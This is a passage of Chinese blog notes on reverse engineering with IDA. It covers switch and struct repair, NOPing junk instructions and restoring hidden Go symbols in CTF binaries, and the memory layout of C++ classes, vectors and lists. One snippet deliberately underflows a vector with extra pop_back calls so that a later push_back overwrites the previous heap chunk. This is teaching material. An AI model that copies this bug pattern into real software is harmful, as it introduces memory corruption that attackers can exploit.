<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906165539.png" alt="image-20210906165538977"></p>
<p>然后对应修改数据</p>
<p><strong>Edit-&gt;Other-&gt;Specify switch idiom</strong></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906164744.png" alt="Snipaste_2021-09-06_16-47-27"></p>
<p>打开之后修改对应数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906170243.png" alt="image-20210906170243406"></p>
<p>其中默认跳转位置可以通过调试看输入其他的选项的跳转位置。</p>

        <h1 id="二、结构体修复"   >
          <a href="#二、结构体修复" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、结构体修复" class="headerlink" title="二、结构体修复"></a>二、结构体修复</h1>
      
        <h2 id="1-Local-Type插入"   >
          <a href="#1-Local-Type插入" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Local-Type插入" class="headerlink" title="1.Local Type插入"></a>1.Local Type插入</h2>
      <p><strong>View-&gt;Open subviews-&gt;Local_types</strong></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906170904.png" alt="image-20210906170904828"></p>
<p>右键Insert输入对应结构体即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906172736.png" alt="image-20210906172736186"></p>

        <h2 id="2-修改为指针"   >
          <a href="#2-修改为指针" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-修改为指针" class="headerlink" title="2.修改为指针"></a>2.修改为指针</h2>
      <p>在对应变量按y修改为对应指针</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906172907.png" alt="image-20210906172907718"></p>

        <h1 id="三、反汇编解析错误"   >
          <a href="#三、反汇编解析错误" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、反汇编解析错误" class="headerlink" title="三、反汇编解析错误"></a>三、反汇编解析错误</h1>
      
        <h2 id="1-花指令"   >
          <a href="#1-花指令" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-花指令" class="headerlink" title="1.花指令"></a>1.花指令</h2>
      <p>IDA中调试出现如下错误，或者观察也知道</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211203163504.png" alt="image-20211203163504409"></p>
<p>这时候可能出现花指令，使得IDA无法正常识别，再往下走IDA跳转到<code>0x40102f</code>，则证明<code>0x40102c~0x40102e</code>这三个字节码都是无效的，直接nop掉，然后<code>patch</code>之后重新打开IDA即可正常识别</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211203164003.png" alt="image-20211203164003865"></p>
<p>以<code>2020De1CTF-mixture</code>为例，IDA打开找到zif_类函数，可以看到堆栈指针问题</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202151145621.png" alt="image-20220215114506575"></p>
<p>那么可能存在花指令或其他的影响，可以参考如下两种方法</p>

        <h3 id="1-堆栈寄存器"   >
          <a href="#1-堆栈寄存器" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-堆栈寄存器" class="headerlink" title="(1)堆栈寄存器"></a>(1)堆栈寄存器</h3>
      <p>首先考虑调试看看堆栈寄存器的变化，如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202151204618.png" alt="image-20220215120401490"></p>
<p>可以看到，在执行从0x122E~0x124D这个代码块之前和之后的寄存器除了rip其他都没有改变。</p>
<p>栈环境除了rsp的值被改变了其他的没有什么影响，而对于栈来说，主要就是栈指针的移动和传入参数的压栈，首先栈指针并没有发生改变，在考虑传入参数的压栈。</p>
<p>传入的参数为如下两个参数rdi和rsi，并且最开始的汇编代码并没有对rdi和rsi进行操作，那么这段代码块就等于无效，相当于就是一个<code>jz 0x124e</code>，那么我们直接给他nop掉即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202151214636.png" alt="image-20220215121425597"></p>

        <h3 id="2-看汇编"   >
          <a href="#2-看汇编" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-看汇编" class="headerlink" title="(2)看汇编"></a>(2)看汇编</h3>
      <p>0x122e~0x124d如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202151221701.png" alt="image-20220215122155647"></p>
<p>可以发现，call l2之后，l2函数通过rax把l2函数的返回地址+8了，也就是从0x1245变成了0x124d，那么就等同于如下代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000122E                 push    rax</span><br><span class="line">.text:000000000000122F                 xor     rax, rax</span><br><span class="line"></span><br><span class="line">.text:0000000000001236                 pop     rax</span><br><span class="line">.text:0000000000001237                 mov     [rsp+98h+arg], 0</span><br><span class="line">.text:000000000000123F                 push    rax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:000000000000124D                 pop     rax</span><br></pre></td></tr></table></div></figure>

<p>这不就相当于啥也没做吗，只是有个<code>mov     [rsp+98h+arg], 0</code>操作而已，但是也不影响参数，等同没有。</p>
<p>之后的0x131E~0x132D也是一样的错误，直接nop掉即可。之后即可正常F5</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202151250416.png" alt="image-20220215125030353"></p>

        <h1 id="四、go语言隐藏"   >
          <a href="#四、go语言隐藏" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、go语言隐藏" class="headerlink" title="四、go语言隐藏"></a>四、go语言隐藏</h1>
      <p>虎符杯2022 gogogo</p>
<p>现有插件或者IDA7.6对go的符号恢复是基于gopclntab段上保留的函数符号，那么如果将该段上的符号函数进行修改或者隐藏，就不太容易逆向了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203241748490.png" alt="image-20220324174816395"></p>
<p>该题就是将main.main和math.init符号表替换，然后在main.main中设置一些原本main函数输入0x12345678退出的功能，使得逆向时我们认为main.main函数就只有这个功能，并没有其他功能，导致无法进行漏洞分析，修改回来就可以了，直接改这个表<code>.gopclntab</code>即可</p>

        <h1 id="五、C-逆向"   >
          <a href="#五、C-逆向" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、C-逆向" class="headerlink" title="五、C++逆向"></a>五、C++逆向</h1>
      
        <h2 id="1-自定义的类"   >
          <a href="#1-自定义的类" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-自定义的类" class="headerlink" title="1.自定义的类"></a>1.自定义的类</h2>
      <figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">   <span class="built_in">A</span>()&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A::A()\n&quot;</span>);</span><br><span class="line">    id = <span class="number">42</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Virtual A::a()\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">virtual</span> ~<span class="built_in">A</span>()&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;A::~A()\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span> <span class="keyword">public</span> A &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">B</span>()&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;B::B()\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">B</span>()&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;B::~B()\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Virtual B::a()\n&quot;</span>);</span><br><span class="line">      A::<span class="built_in">a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">b</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Virtual B::b()\n&quot;</span>);</span><br><span class="line">        A::<span class="built_in">a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>


        <h3 id="1-类的内存分布"   >
          <a href="#1-类的内存分布" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-类的内存分布" class="headerlink" title="(1)类的内存分布"></a>(1)类的内存分布</h3>
      
        <h4 id="①没有父类的"   >
          <a href="#①没有父类的" class="heading-link"><i class="fas fa-link"></i></a><a href="#①没有父类的" class="headerlink" title="①没有父类的"></a>①没有父类的</h4>
      <p>用上述代码的<code>class A</code>来举例</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%20(14).png" alt="未命名文件 (14)"></p>
<p>在调用构造函数<code>A::A()</code>之前会从堆里申请一块空间，即<code>class A</code>的空间，包括指针和成员。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220423210047186.png" alt="image-20220423210047186"></p>
<p>在<code>A::A()</code>构造函数调用之后会初始化该堆空间，申请的堆空间如下。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220423212133886.png" alt="image-20220423212133886"></p>
<p>然后还需要注意的是有两个函数指针，析构函数指针1和析构函数指针2，其中析构函数指针2是实际的用来释放空间的函数，即原始的析构函数，并且其中会调用到析构函数指针1，即用户自定义的析构函数相关的代码，并且地址是连在一起的，如下所示。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220423211833831.png" alt="image-20220423211833831"></p>

        <h4 id="②有父类的"   >
          <a href="#②有父类的" class="heading-link"><i class="fas fa-link"></i></a><a href="#②有父类的" class="headerlink" title="②有父类的"></a>②有父类的</h4>
      <p>以上述代码的<code>class B</code>来举例</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%20(15).png" alt="未命名文件 (15)"></p>
<p>其他的和没有父类的class也是差不多的。</p>

        <h4 id="③未申请空间的类"   >
          <a href="#③未申请空间的类" class="heading-link"><i class="fas fa-link"></i></a><a href="#③未申请空间的类" class="headerlink" title="③未申请空间的类"></a>③未申请空间的类</h4>
      <p>比如<code>A obj_a;</code>这种写法，那么其<code>public</code>的成员会变成栈上的变量，<code>private</code>成员无法访问，访问其成员函数还是在.text段上对应的。</p>

        <h3 id="2-常规写法"   >
          <a href="#2-常规写法" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-常规写法" class="headerlink" title="(2)常规写法"></a>(2)常规写法</h3>
      <ul>
<li><p><code>A *point_obj_A = new A;</code> ：会调用A的构造函数</p>
<p><code>A *point_obj_A = new(A);</code> ：同上，一样的</p>
</li>
<li><p><code>A obj_A;</code> ：A的构造函数调用之后，如果没有其他的操作，那么程序会自动释放该对象，调用析构函数，相当于局部变量。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220423173148441.png"></p>
</li>
<li><p><code>B *point_obj_b = new B;</code>会先调用A的构造函数，然后再调用B的构造函数，和前面的指针没有太多关系，直接<code>B obj_B</code>也是一样的</p>
</li>
<li><p><code>A *point_obj_b = new B;</code>一样的，只是将<code>point_obj_b </code>标记为类型为A的指针，但是这样的话该对象指针<code>point_obj_b</code>就不能调用到子类B的函数<code>b()</code>了。(子类指针可以调用父类的函数，但是父类指针不能调用子类的特有函数)</p>
</li>
</ul>

        <h2 id="2-容器类Vector"   >
          <a href="#2-容器类Vector" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-容器类Vector" class="headerlink" title="2.容器类Vector"></a>2.容器类Vector</h2>
      
        <h3 id="1-容器创建"   >
          <a href="#1-容器创建" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-容器创建" class="headerlink" title="(1)容器创建"></a>(1)容器创建</h3>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/176870" >C++逆向之容器vector篇入门 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h4 id="①声明容器"   >
          <a href="#①声明容器" class="heading-link"><i class="fas fa-link"></i></a><a href="#①声明容器" class="headerlink" title="①声明容器"></a>①声明容器</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test1;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对应IDA代码</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::<span class="built_in">vector</span>(v8, argv, envp);</span><br></pre></td></tr></table></div></figure>

<p>这个不造成堆空间的分配</p>

        <h4 id="②声明并初始化大小"   >
          <a href="#②声明并初始化大小" class="heading-link"><i class="fas fa-link"></i></a><a href="#②声明并初始化大小" class="headerlink" title="②声明并初始化大小"></a>②声明并初始化大小</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">test2</span><span class="params">(<span class="number">5</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对应IDA代码</span></span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(v13);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::<span class="built_in">vector</span>(v9, <span class="number">5LL</span>, v13);</span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(v13);</span><br></pre></td></tr></table></div></figure>

<p>这个在调用vector的构造函数时，会有堆空间的申请，用来存放容器内的数据，依据定义的大小来进行申请，比如这里就申请了5个int的变量，那么大小为5*4=20个字节，对应在堆空间里就需要申请0x20大小的堆块来存放。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424112805438.png" alt="image-20220424112805438"></p>
<p>使用malloc来申请</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424112952718.png" alt="image-20220424112952718"></p>

        <h4 id="③声明并初始化大小和值"   >
          <a href="#③声明并初始化大小和值" class="heading-link"><i class="fas fa-link"></i></a><a href="#③声明并初始化大小和值" class="headerlink" title="③声明并初始化大小和值"></a>③声明并初始化大小和值</h4>
      <p>容量+初始值模式</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">test3</span><span class="params">(<span class="number">10</span>,<span class="number">1</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对应IDA代码</span></span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(v12);</span><br><span class="line">v13[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::<span class="built_in">vector</span>(v10, <span class="number">10LL</span>, v13, v12);</span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(v12);</span><br></pre></td></tr></table></div></figure>

<p>可以看到也是类似的，会创建一个局部变量v13作为初始值1传入vector的构造函数，并且申请堆空间后会进行初始化，所需大小为10*4=40个字节，对应0x30的堆空间，并且会初始化为1，如下所示。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424113519816.png" alt="image-20220424113519816"></p>
<p>相关寄存器如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424120832499.png" alt="image-20220424120832499"></p>

        <h4 id="④使用地址进行初始化"   >
          <a href="#④使用地址进行初始化" class="heading-link"><i class="fas fa-link"></i></a><a href="#④使用地址进行初始化" class="headerlink" title="④使用地址进行初始化"></a>④使用地址进行初始化</h4>
      <p>Begin+End模式</p>
<p>这里区别于之前的传值，即容量的值以及初始值的地址，取而代之的是数据的起始地址和结束地址。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入test3在堆申请的存放数据的起始堆地址和结束堆地址，依据这段数据来进行初始化</span></span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">test5</span><span class="params">(test3.begin(), test3.end())</span></span>;</span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line"><span class="comment">//对应的传入两个地址进行初始化，即array的相关数据处的地址</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">test6</span><span class="params">(&amp;<span class="built_in">array</span>[<span class="number">1</span>], &amp;<span class="built_in">array</span>[<span class="number">4</span>])</span></span>;</span><br><span class="line">getchar();</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line"><span class="comment">//对应IDA代码</span></span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(v17, <span class="number">1LL</span>, v5);</span><br><span class="line">v6 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::end(v14);</span><br><span class="line">v7 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::begin(v14);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::<span class="built_in">vector</span>&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;,<span class="keyword">void</span>&gt;(v16, v7, v6, v17);</span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(v17);</span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v17[<span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line">v18[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">v18[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">v18[<span class="number">2</span>] = <span class="number">4</span>;</span><br><span class="line">v19 = <span class="number">5</span>;</span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v10, v7, v8);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::<span class="built_in">vector</span>&lt;<span class="keyword">int</span> *,<span class="keyword">void</span>&gt;(v17, v18, &amp;v19, &amp;v10);</span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v10);</span><br><span class="line">getchar();</span><br></pre></td></tr></table></div></figure>

<p>相关寄存器如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424120944256.png" alt="image-20220424120944256"></p>
<p>栈上的数组模式</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424121023804.png" alt="image-20220424121023804"></p>

        <h4 id="⑤总结"   >
          <a href="#⑤总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#⑤总结" class="headerlink" title="⑤总结"></a>⑤总结</h4>
      <p>主要就是关注<code>vector</code>的构造函数</p>
<ul>
<li><p>未初始化的只有<code>vector</code>构造函数</p>
</li>
<li><p>初始化容量或者值的，就会调用<code>allocator</code>来为容器进行分配，并且在<code>vector</code>的构造函数调用时会从堆上分配空间。</p>
</li>
<li><p>在IDA中的<code>vector</code>的构造函数中</p>
<ul>
<li><p>参数一(RDI寄存器)：即栈上保存<code>vector</code>变量的栈地址，指向申请的堆空间地址。后面传入<code>vector</code>的析构函数进行销毁。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424143520190.png" alt="image-20220424143520190"></p>
<p>其中的Begin和End是有效数据的地址范围，下面的那个地址是该容器申请的堆空间的末尾地址。</p>
</li>
<li><p>参数二(RSI寄存器)：容量+初值模式就传入容量的值，Begin+End模式就传入Begin处的地址。</p>
</li>
<li><p>参数三(RDX寄存器)：容量+初值模式就传入初值的地址，Begin+End模式就传入End处的地址。没有就为<code>allocator</code>的参数。</p>
</li>
<li><p>参数四(RCX寄存器)：一般为<code>allocator</code>的参数，没有初值的时候就在参数三中。</p>
</li>
</ul>
</li>
<li><p>最后会自动调用析构函数，传入构造函数创建时保存堆空间指针的栈地址。</p>
</li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::~<span class="built_in">vector</span>(v17);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::~<span class="built_in">vector</span>(v16);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::~<span class="built_in">vector</span>(v15);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::~<span class="built_in">vector</span>(v14);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::~<span class="built_in">vector</span>(v13);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::~<span class="built_in">vector</span>(v12);</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-容器操作"   >
          <a href="#2-容器操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-容器操作" class="headerlink" title="(2)容器操作"></a>(2)容器操作</h3>
      <p>主要关注<code>push_back</code>和<code>pop_back</code></p>
<ul>
<li><p><code>push_back</code>：</p>
<ul>
<li>参数一：栈上保存申请堆空间指针的栈地址</li>
<li>参数二：要压入<code>vector</code>的值</li>
</ul>
<p>如果空间超过申请的堆空间大小，会free掉当前堆空间，然后malloc申请比之前大小的两倍减去0x10的大小。比如当前空间为0x50，那么扩容之后就是0x50*2-0x10的大小。</p>
</li>
<li><p><code>pop_back</code>：</p>
<ul>
<li>参数：栈上保存申请堆空间指针的栈地址</li>
</ul>
<p>只会修改之前提到的End地址，pop完之后如果接着pop则End会接着减少，会小于Begin的地址。</p>
</li>
</ul>
<p>这里就存在漏洞了，就是如果接着pop会导致End不断减少，当小于Begin的地址时，这时候再push_back的话，就会在小于Begin地址处写入数据，导致堆块数据被重写，如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">2</span>; i++)</span><br><span class="line">    test.push_back(i);</span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">    test.pop_back();</span><br><span class="line">getchar();</span><br><span class="line">test.push_back(<span class="number">0x50</span>);</span><br></pre></td></tr></table></div></figure>

<p>这样就会导致上一个堆块的数据被覆盖为0x50</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424145337189.png"></p>
<p>此时再<code>push_back(0x50)</code>，会如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220424145432745.png" alt="image-20220424145432745"></p>
<p>就导致漏洞产生了。</p>
<p>相关的IDA代码如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::<span class="built_in">vector</span>(v11, argv, envp);</span><br><span class="line"><span class="keyword">for</span> ( v12[<span class="number">0</span>] = <span class="number">0</span>; v12[<span class="number">0</span>] &lt;= <span class="number">1</span>; ++v12[<span class="number">0</span>] )</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(v11, v12);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::pop_back(v11);</span><br><span class="line">getchar();</span><br><span class="line">v12[<span class="number">0</span>] = <span class="number">80</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::push_back(v11, v12);</span><br></pre></td></tr></table></div></figure>

<p>这个还是挺简单的，就不说了。</p>
<p>其他的像<code>empty()</code>、<code>resize()</code>、<code>clear()</code>什么的也是类似的，不多说了。</p>
<p>🔺注</p>
<p>对于类<code>class</code>放入<code>vector</code>的情况，在<code>vector</code>中只会保存对象的成员变量，而它的函数指针并不会保存</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221128143715373.png" alt="image-20221128143715373"></p>
<p>当从容器中取出来时，会通过一个函数来获取对应成员的地址，之后传入对应的函数。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221128143616124.png" alt="image-20221128143616124"></p>

        <h2 id="3-容器类list"   >
          <a href="#3-容器类list" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-容器类list" class="headerlink" title="3.容器类list"></a>3.容器类list</h2>
      <p>常见双向循环链表管理</p>
<p>双向循环链表，定义之后栈上只保存头节点地址和尾部节点地址</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221128145817008.png" alt="image-20221128145817008"></p>
<p>每次申请<code>push_back</code>加入对象时都会使用<code>malloc</code>申请，创建<code>next、prev</code>指针，然后拷贝数据，将其放入双向循环链表中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221128150028794.png" alt="image-20221128150028794"></p>

        <h1 id="六、控制流去平坦化"   >
